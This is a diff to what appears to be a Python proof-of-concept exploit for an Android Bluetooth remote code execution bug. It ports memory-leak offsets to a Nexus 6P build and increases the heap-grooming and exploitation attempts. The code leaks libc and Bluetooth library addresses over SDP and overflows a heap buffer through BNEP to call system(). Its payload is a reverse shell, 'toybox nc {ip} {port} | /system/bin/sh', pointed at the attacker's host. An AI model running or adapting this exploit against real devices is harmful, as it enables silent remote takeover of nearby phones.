@@ -26,27 +26,23 @@ STDIN_PORT = 1235
 # bullhead:/ # sha1sum /system/lib/libc.so
 # 0b5396cd15a60b4076dacced9df773f75482f537  /system/lib/libc.so
 
-# For Pixel 7.1.2 patch level Aug/July 2017
-LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1 - 56 # system + 1
-LIBC_SOME_BLX_OFFSET = 0x1a420 + 1 - 608 # eventfd_write + 28 + 1
+# For Nexus6p 7.0.0 r5
+LIBC_TEXT_STSTEM_OFFSET = 0x45ed0 + 1 # system + 1, why?
+BSS_ACL_REMOTE_NAME_OFFSET = 0xc37dc
 
-# For Nexus 5X 7.1.2 patch level Aug/July 2017
-#LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1
-#LIBC_SOME_BLX_OFFSET = 0x1a420 + 1
-
-# Aligned to 4 inside the name on the bss (same for both supported phones)
-BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
-BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x14b244
+# For Nexus6p 7.0.0 r5
+LIBC_SOME_BLX_OFFSET = 107521
+BLUETOOTH_BSS_SOME_VAR_OFFSET = -351097 - 0x460
 
 MAX_BT_NAME = 0xf5
 
 # Payload details (attacker IP should be accessible over the internet for the victim phone)
-SHELL_SCRIPT = b'toybox nc {ip} {port} | sh'
+SHELL_SCRIPT = b'toybox nc {ip} {port} | /system/bin/sh'
 
 
 PWNING_TIMEOUT = 3
 BNEP_PSM = 15
-PWN_ATTEMPTS = 10
+PWN_ATTEMPTS = 100
 LEAK_ATTEMPTS = 5
 
 
@@ -93,10 +89,10 @@ def memory_leak_get_bases(src, src_hci, dst):
 
     # Get leaked stack data. This memory leak gets "deterministic" "garbage" from the stack.
     result = bluedroid.do_sdp_info_leak(dst, src)
-
+    print result
     # Calculate according to known libc.so and bluetooth.default.so binaries
     likely_some_libc_blx_offset = result[-3][-2]
-    likely_some_bluetooth_default_global_var_offset = result[6][0]
+    likely_some_bluetooth_default_global_var_offset = result[-1][-4]
 
     libc_text_base = likely_some_libc_blx_offset - LIBC_SOME_BLX_OFFSET
     bluetooth_default_bss_base = likely_some_bluetooth_default_global_var_offset - BLUETOOTH_BSS_SOME_VAR_OFFSET
@@ -121,6 +117,7 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my
     payload = struct.pack('<III', 0xAAAA1722, 0x41414141, system_addr) + b'";\n' + \
                           SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'
 
+    print payload
     assert len(payload) < MAX_BT_NAME
     assert b'\x00' not in payload
 
@@ -140,7 +137,7 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my
     # This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.
     # These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).
     # Thus "holes" are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.
-    for i in range(20):
+    for i in range(100):
         bnep.send(binascii.unhexlify('8109' + '800109' * 100))
 
     # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
@@ -175,14 +172,16 @@ def main(src_hci, dst, my_ip):
         # Try to leak section bases
         for j in range(LEAK_ATTEMPTS):
             libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(src, src_hci, dst)
-            if (libc_text_base & 0xfff == 0) and (bluetooth_default_bss_base & 0xfff == 0):
+            if (libc_text_base & 0xfff == 0):
                 break
         else:
            assert False, "Memory doesn't seem to have leaked as expected. Wrong .so versions?"
 
         system_addr = LIBC_TEXT_STSTEM_OFFSET + libc_text_base
         acl_name_addr = BSS_ACL_REMOTE_NAME_OFFSET + bluetooth_default_bss_base
-        assert acl_name_addr % 4 == 0
+        print 'system_addr = ' + hex(system_addr)
+        print 'acl_name_addr = ' + hex(acl_name_addr)
+
         log.info('system: 0x%08x, acl_name: 0x%08x' % (system_addr, acl_name_addr))
 
         pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base)
